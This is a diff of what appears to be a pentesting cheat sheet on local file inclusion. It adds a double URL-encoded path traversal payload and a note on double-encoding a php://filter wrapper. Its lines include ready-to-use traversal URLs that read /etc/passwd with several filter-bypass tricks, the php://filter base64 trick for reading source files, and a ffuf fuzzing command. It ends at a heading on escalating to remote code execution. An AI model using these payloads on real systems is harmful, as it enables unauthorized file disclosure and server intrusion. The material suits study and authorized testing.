@@ -48,8 +48,8 @@ http://<SERVER_IP>:<PORT>/index.php?language=....\/....\/....\/etc/passwd
 http://<SERVER_IP>:<PORT>/index.php?language=....\/....\/....\/etc/passwd
 http://<SERVER_IP>:<PORT>/index.php?language=....////....////....////etc/passwd
 
-# Encoding payloads. We may double encode the strings to bypass other filters
-http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+# Encoding payloads. We may double URL encode strings using Burp's decoder to bypass other filters
+http://<SERVER_IP>:<PORT>/index.php?language=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
 
 # Approved path w/ the path (or folder) used by default w/ the web app. Here it is "languages"
 http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
@@ -74,6 +74,8 @@ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:
 # Read the config page : here the web app is appending the .php extension to the page
 php://filter/read=convert.base64-encode/resource=config
 echo 'BASE64_STRING' | base64 -d
+
+# We may also try to double URL encode using Burp's encoder the wrapper to try to bypass filters
 ```
 ## LFI to RCE
 We may use `file inclusion` to `execute code` on the back-end servers and gain control over them.
